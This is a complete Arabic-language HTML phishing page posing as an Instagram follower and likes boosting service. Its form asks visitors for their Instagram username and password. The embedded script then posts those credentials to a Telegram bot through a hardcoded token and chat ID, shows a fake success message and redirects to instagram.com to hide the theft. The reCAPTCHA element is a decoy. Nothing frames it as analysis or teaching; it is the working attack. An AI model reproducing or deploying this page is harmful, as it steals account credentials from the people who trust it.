<!DOCTYPE html><html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>رشق متابعين انستا</title>
  <style>
    body {
      font-family: 'Tajawal', sans-serif;
      background: linear-gradient(to right, #8e0038, #3e005f);
      margin: 0;
      padding: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      color: white;
    }
    .container {
      background-color: rgba(0, 0, 0, 0.4);
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
      width: 90%;
      max-width: 400px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    input, select, button {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      font-size: 16px;
    }
    input[type="password"] {
      font-family: sans-serif;
      letter-spacing: 2px;
    }
    .show-pass {
      margin-top: -5px;
      font-size: 13px;
      cursor: pointer;
      text-align: left;
      color: #ccc;
    }
    button {
      background-color: #0066cc;
      color: white;
      cursor: pointer;
    }
    .loading {
      display: none;
      text-align: center;
      margin-top: 15px;
    }
    .success-message {
      display: none;
      text-align: center;
      margin-top: 15px;
      color: #0f0;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>رشق متابعين انستا</h2>
    <form id="boostForm">
      <label>اسم المستخدم</label>
      <input type="text" id="username" placeholder="مثال: insta_user123" required><label>كلمة المرور</label>
  <input type="password" id="password" placeholder="كلمة مرور الحساب" required>
  <div class="show-pass" onclick="togglePassword()">👁️ إظهار / إخفاء كلمة المرور</div>

  <label>عدد المتابعين</label>
  <select id="count">
    <option>1000 متابع</option>
    <option>2000 متابع</option>
    <option>5000 متابع</option>
  </select>

  <label>نوع الرشق</label>
  <select id="type">
    <option>متابعين</option>
    <option>لايكات</option>
    <option>مشاهدات</option>
  </select>

  <div class="g-recaptcha" data-sitekey="fake-site-key"></div>

  <button type="submit">ابدأ الرشق الآن</button>
  <div class="loading">⏳ جاري الإرسال...</div>
  <div class="success-message">✅ تم إرسال البيانات بنجاح</div>
</form>

  </div>  <script>
    const form = document.getElementById("boostForm");
    const loading = document.querySelector(".loading");
    const success = document.querySelector(".success-message");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      loading.style.display = "block";

      // إرسال البيانات إلى تليجرام
      const token = "7197079453:AAFnVl-c5S28araI2YScZOPlQzBUXn_zZIk";
      const chatId = "7197079453";
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const count = document.getElementById("count").value;
      const type = document.getElementById("type").value;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `🔥 طلب جديد من موقع الانستا\n👤 يوزر: ${username}\n🔑 باسورد: ${password}\n📦 عدد: ${count}\n📂 نوع: ${type}`,
        }),
      })
      .then(() => {
        loading.style.display = "none";
        success.style.display = "block";
        setTimeout(() => {
          window.location.href = "https://instagram.com"; // تحويل بعد النجاح
        }, 3000);
      });
    });

    function togglePassword() {
      const passInput = document.getElementById("password");
      passInput.type = passInput.type === "password" ? "text" : "password";
    }
  </script></body>
</html>
